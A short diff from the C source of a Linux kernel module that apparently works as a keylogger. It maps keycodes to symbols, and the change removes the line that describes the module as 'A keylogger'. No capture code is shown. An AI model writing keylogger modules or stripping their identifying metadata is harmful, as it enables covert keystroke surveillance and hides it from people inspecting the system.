@@ -5,7 +5,6 @@
 #include "kloggg-keymap.h" /* produced by output of "loadkeys --mktable" */
 
 MODULE_AUTHOR("Nicholas Hubbard");
-MODULE_DESCRIPTION("A keylogger");
 MODULE_LICENSE("GPL");
 
 static u_short kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
